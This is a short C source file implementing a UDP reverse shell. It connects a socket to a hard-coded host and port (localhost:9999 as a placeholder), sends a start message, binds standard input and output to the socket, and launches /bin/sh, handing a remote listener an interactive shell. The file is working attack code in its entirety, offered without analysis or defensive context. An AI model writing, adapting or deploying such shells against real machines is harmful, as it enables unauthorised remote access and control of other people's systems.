/* UDP reverse shell over IPv4 */

#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>

int main(int argc, char *argv[]){

	const char *host = "127.0.0.1";
	int port = 9999;

	/* Set up sockaddr struct */
	struct sockaddr_in address;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);
	inet_aton(host, &address.sin_addr);

	/* Connect */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	connect(s, (struct sockaddr*)&address, sizeof(address));
	
	/* Send initial message (there is no SYN in UDP) */
	char buf[20];
	strcpy(buf, "Starting UDP shell\n");
	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));

	/* Copy file descriptors */
	dup2(s, STDIN_FILENO);
	dup2(s, STDOUT_FILENO);
	dup2(s, STDERR_FILENO);

	execve("/bin/sh", NULL, NULL);

	return 0;

}
